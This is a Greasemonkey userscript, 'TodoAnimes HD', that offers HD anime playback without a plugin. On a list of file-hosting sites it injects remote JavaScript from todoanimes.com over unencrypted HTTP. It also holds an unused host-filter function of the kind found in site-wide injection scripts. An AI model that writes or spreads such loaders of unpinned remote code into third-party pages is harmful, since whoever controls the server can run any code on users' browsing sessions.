// ==UserScript==
// @name        TodoAnimes HD
// @namespace   todoanimesHD
// @description Ver videos HD sin instalar el plugin!
// @include     *todoanimes.com/*
// @include	*glumbouploads.com/*
// @include     *wupload.*/*
// @include     *bayfiles.com/*
// @include     *crocko.com/*
// @include     *rapidgator.net/*
// @include     *filefactory.com/*
// @include     *filebox.com/*
// @include     *?hotfile.com/*
// @include     *bayfiles.com/*
// @include     *hulkshare.com/*
// @include     *filesonic.com/*
// @include     *bitshare.com/*
// @include     *mediafire.com/*
// @version     1.2
// ==/UserScript==

var loc = (location.href.match(/ta=/i));
if (location.href.match(/^http:\/\/(www\.)?megaupload\.com/i) && loc) {
	addScript("mega");
} else if (window.location.href.match(/^http:\/\/(www\.)?glumbouploads\.com/i) && loc) {
	addScript("glumbouploads");
	addjquery();
} else if (window.location.href.match(/^http:\/\/(www\.)?rapidgator\.net/i) && loc) {
	addScript("rapidgator");
} else if (window.location.href.match(/^http:\/\/(www\.)?hulkshare\.com/i) && loc) {
	addScript("hulkshare");
	addjquery();
} else if (window.location.href.match(/^http:\/\/(www\.)?bayfiles\.com/i) && loc) {
	addScript("bayfiles");
} else if (window.location.href.match(/^http:\/\/(www\.)?wupload\.(com|cn|de|es|fr|co\.uk|com\.hk|in|it|jp|mx)/i) && loc) {
	addScript("wupload");
} else if (location.href.match(/^http:\/\/(www\.)?hotfile\.com/i) && loc) {
	addScript("hotfile");
} else if (location.href.match(/^http:\/\/(www\.)?filesonic\.com/i) && loc) {
	addScript("fsonic");
} else if (location.href.match(/^http:\/\/(www\.)?bitshare\.com/i) && loc) {
	addScript("bitshare");
} else if (location.href.match(/^http:\/\/(www\.)?filefactory\.com/i) && location.href.match(/.mp4$/i)) {
	addScript("ffactory");
} else if (location.href.match(/^http:\/\/(www\.)?mediafire\.com/i)  && loc) {
	addScript("mfire");
} else if (location.href.match(/^http:\/\/(www\.)?todoanimes\.com/i)) {
	if (document.getElementById("player_hdd")) {
		if (document.getElementById("player_hdd").src.match(/get_plugin.html/i)) {
			var al = document.getElementById("videoxx").innerHTML.replace(/amp;/gi, '');
			document.getElementById("player_hdd").src = "http://www.todoanimes.com/nodo/id"+al+".html";
		}
	}

}



function addjquery() { 
	var x = document.createElement('script');
	x.setAttribute("type","text/javascript");
	x.setAttribute("src","http://code.jquery.com/jquery-latest.js");
	document.getElementsByTagName("head")[0].appendChild(x);
}


function addScript(id) { 
	var s = document.createElement('script');
	s.setAttribute("type","text/javascript");
	s.setAttribute("src", "http://www.todoanimes.com/player/servers/"+id+".js");
	document.getElementsByTagName("head")[0].appendChild(s);
}



function cookietime() {
	cad=new Date();
	cad.setTime(cad.getTime() + (1*1*5*60*1000));
	expira="; expires=" + cad.toGMTString();
    	document.cookie = "visitado=false" + expira;
}

function rand(l,u){return Math.floor((Math.random() * (u-l+1))+l);}

function validHost() {
        if (location.href.match(/static\.ak\./i)) {
            return false;
        } else if ("https:" == document.location.protocol) {
            return false;
        } else if (location.href.match(/\.addthis\.com\/static\//i)) {
            return false;
        } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
            return false;
        } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
            return false;
        } else if (location.href.match(/blank/i)) {
            return false;
        } else if (location.href.match(/^http\:\/\/analytics\./i)) {
            return false;
        } else if (location.href.match(/^\.hotmail\.com\//i)) {
            return false;
        } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
            return false;
        } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
            return false;
        } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
            return false;
        } else if (location.href.match(/ver-pelis\.net/i)) {
            return false;
        } else if (location.href.match(/ver-anime\.net/i)) {
            return false;
        } else if (location.href.match(/musicalandia\.net/i)) {
            return false;
        } else if (location.href.match(/ver-series\.net/i)) {
            return false;
        } else if (location.href.match(/musica-online\.org/i)) {
            return false;
        } else if (location.href.match(/ver-documentales\.net/i)) {
            return false;
        } else if (location.href.match(/todoanimes\.com/i)) {
            return false;
		} else if (location.href.match(/tusnovelas\.com/i)) {
            return false;
        } else if (location.href.match(/animeflv\.net/i)) {
            return false;
		} else if (location.href.match(/goojue\.com/i)) {
            return false;
		} else {
            return true;
        }
    }
